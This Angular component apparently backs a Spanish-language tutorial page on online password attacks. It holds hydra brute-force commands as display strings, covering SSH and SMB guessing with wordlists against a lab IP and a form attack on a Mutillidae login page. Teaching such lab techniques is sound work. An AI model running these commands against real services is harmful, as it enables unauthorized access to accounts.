import { Component} from '@angular/core';
import { Title } from '@angular/platform-browser';
import { Router, NavigationEnd } from '@angular/router';
@Component({
  selector: 'app-online-password-attack',
  templateUrl: './online-password-attack.component.html',
  styleUrl: './online-password-attack.component.css'
})
export class OnlinePasswordAttackComponent{

  pageTitle: string = '';
  hydra:  string = `hydra -L [diccionario usuarios] -P [diccionario contraseñas] [IP] [servicio]`;
  hydraUser:  string = `hydra -l test -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt example.ip ssh`;
  hydraSmb:  string = `hydra -l msfadmin -P rockyou.txt 192.168.1.135 smb`;
  hydraLogin:  string = `hydra [IP] http-post-form "[URL]:[username]=^USER^&[password]=^PASS^:[Mensaje error]" -L [diccionario usuarios] -P [diccionario contraseñas]`;
  hydraLoginOk: string = `hydra -l cyberSec -P testFile 192.168.1.135 http-post-form "/mutillidae/index.php?page=login.php:username=^USER^&password=^PASS^&login-php-submit-button=Login:Not Logged In" -V`;
  comando:  string = 'comando';
  constructor(private titleService: Title, private router: Router) {
    this.router.events.subscribe((event) => {
      if (event instanceof NavigationEnd) {
        window.scrollTo(0, 0); // Scrolls to the top of the page
      }
    });
  }

  ngOnInit(): void {
    this.pageTitle = 'Ataques a contraseñas online';
    this.titleService.setTitle(this.pageTitle);
  }
  copyContent(param: any) {
    const codeContainer = document.querySelector(param) as HTMLElement;
    console.log(codeContainer);
    if (codeContainer) {
      const range = document.createRange();
      range.selectNode(codeContainer);
      window.getSelection()?.removeAllRanges();
      window.getSelection()?.addRange(range);
      document.execCommand('copy'); // Copia el texto seleccionado al portapapeles
      window.getSelection()?.removeAllRanges();
    }
  }
}
